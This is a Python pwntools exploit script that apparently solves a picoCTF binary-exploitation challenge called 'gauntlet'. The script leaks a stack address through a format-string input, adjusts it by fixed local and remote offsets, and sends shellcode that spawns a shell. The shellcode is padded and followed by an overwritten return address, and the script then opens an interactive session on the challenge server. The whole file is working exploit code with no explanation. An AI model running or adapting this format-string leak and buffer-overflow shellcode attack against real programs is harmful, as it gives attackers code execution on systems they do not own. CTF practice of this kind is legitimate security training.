#!/usr/bin/env python3

from pwn import *

exe = ELF("./gauntlet")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("wily-courier.picoctf.net", 65276)

    return r


def main():
    r = conn()

    r.sendline(b"%6$lx")
    shellcode_entry = int(r.recvline().strip(), 16)

    if args.LOCAL:
        shellcode_entry -= 0x198
    else:
        shellcode_entry -= 0x158

    log.info(f"shellcode_entry @ 0x{shellcode_entry:x}")
    
    payload = asm(shellcraft.linux.sh() + shellcraft.linux.exit(0)).ljust(0x78, b"A") + p64(shellcode_entry)
    r.sendline(payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
